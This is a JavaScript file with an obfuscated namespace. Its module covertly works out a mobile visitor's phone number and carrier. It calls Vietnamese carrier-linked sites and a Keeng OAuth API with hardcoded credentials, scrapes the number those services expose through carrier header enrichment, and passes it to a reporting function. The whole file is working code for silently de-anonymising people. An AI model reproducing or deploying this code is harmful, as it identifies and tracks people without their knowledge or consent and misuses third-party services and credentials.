___.Phone = {
	normViettel: function (p) {
		var i = p.indexOf('-');
		i > 0 && (p = '0' + p.substr(i + 1));
		return p;
	},
	norm: function (p) {
		p = this.normViettel(p);
		var pf = ['', '0', '84', '+84', '(84)', '(+84)'];
		p.includes('\n') && (p = p.replace('\n', ''));
		for (var i = 1, l = pf.length; i < l; i++) {
			if (p.startsWith(pf[i])) {
				return '0' + p.substr(i);
			}
		}
		!p.startsWith('0') && (p = '0' + p);
		return p;
	}
};

___.Msisdn = {
	detect: function () {
		this.dvt();
	},
	dvnp: function () {
		___.ajax({
			url: 'http://1dong.vn/dang-nhap.html',
			method: 'GET',
			success: function (d) {
				try {
					var it = (new DOMParser()
								.parseFromString(d, 'text/html')
								.getElementsByClassName('signup')[0]
						).innerText || '';
					if (it.length > 0) {
						___.Report.success({
							phone: ___.Phone.norm(it),
							carrier: 'Vinaphone'
						});
					} else {
						___.Report.error({
							src: '___.Msisdn.dvnp.success@1.0',
							msg: 'it'
						});
					}
				}
				catch (ex) {
					___.Report.error({
						src: '___.Msisdn.dvnp.success@1.0',
						msg: 'Exception : ' + ex.message
					});
				}
			},
			error: function (xhr) {
				___.Report.error({
					src: '___.Msisdn.dvnp.error@1.0',
					msg: xhr.responseText
				});
			}
		});
	},
	dmbp: function () {
		var _s = this;
		___.ajax({
			url: 'http://m.mvoice.vn/bongda/wap/17871/tin-chi-tiet.html',
			method: 'GET',
			success: function (d) {
				try {
					var it = (new DOMParser()
								.parseFromString(d, 'text/html')
								.getElementsByClassName('HelloPhone')[0]
								.getElementsByTagName('span')[0]
						).innerText || '';
					if (it.length > 0) {
						___.Report.success({
							phone: ___.Phone.norm(it),
							carrier: 'Mobiphone'
						})
					} else {
						_s.dvnp();
					}
				} catch (ex) {
					_s.dvnp();
				}
			},
			error: function (xhr) {
				___.Report.error({
					src: "___.Msisdn.dmbp.error@1.0",
					msg: xhr.responseText
				});
			}
		});
	},
	dvt: function () {
		var _s = this;
		___.ajax({
			url: 'http://api.keeng.vn/v1/private/oauth/token',
			method: 'POST',
			data: 'grant_type=password&username=keengjs&password=keengjs&client_id=keengjsclient&client_secret=keengjsclient',
			contentType: 'application/x-www-form-urlencoded',
			success: function (fd) {
				try {
					fd = JSON.parse(fd);
					if (fd.access_token) {
						___.ajax({
							url: 'http://api.keeng.vn/v1/private/oauth/getUserInfo',
							method: 'POST',
							contentType: 'application/x-www-form-urlencoded',
							data: 'access_token=' + fd.access_token,
							success: function (sd) {
								try {
									sd = JSON.parse(sd);
									// Viettel 3G : {"user_id":"[0-9]-[msisdn]",...}
									// Non-Viettel 3G : {"user_id":"0-mobi",...}
									if (sd.user_id != '0-mobi') {
										___.Report.success({
											phone: ___.Phone.norm(sd.user_id),
											carrier: 'Viettel'
										});
									} else {
										_s.dmbp();
									}
								} catch (ex) {
									___.Report.error({
										src: "___.Msisdn.dvt.success.success@1.0",
										msg: 'Exception :' + ex.message
									});
								}
							},
							error: function (xhr) {
								___.Report.error({
									src: "___.Msisdn.dvt.success.error@1.0",
									msg: xhr.responseText
								});
							}
						});
					} else {
						___.Report.error({
							src: "___.Msisdn.dvt.success@1.0",
							msg: 'fd.access_token'
						});
					}
				}
				catch (ex) {
					___.Report.error({
						src: "___.Msisdn.dvt.success.catch@1.0",
						msg: ex.message
					});
				}
			},
			error: function (xhr) {
				// Request từ các thiết bị non-mobile
				// HTTP/1.0 400 Bad Request
				// {"error":"invalid_grant","error_description":"Unable to retrieve user information"}
				if (xhr.responseText.includes('invalid_grant')) {
					_s.dmbp();
				} else {
					___.Report.error({
						src: "___.Msisdn.dvt.error@1.0",
						msg: xhr.responseText
					});
				}
			}
		});
	}
};